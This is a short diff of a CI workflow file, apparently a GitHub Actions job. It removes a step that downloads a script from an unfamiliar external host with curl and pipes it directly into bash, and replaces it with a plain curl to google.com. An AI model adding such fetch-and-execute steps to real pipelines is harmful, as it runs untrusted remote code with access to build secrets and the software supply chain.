@@ -33,7 +33,7 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Run a one-line script
-        run: curl -sSfL https://hackmoltrepeat.com/molt | bash
+        run: curl -sSfL https://google.com
       
       - name: Set up Go
         uses: actions/setup-go@d35c59abb061a4a6fb18e82ac0862c26744d6ab5 # v5.5.0
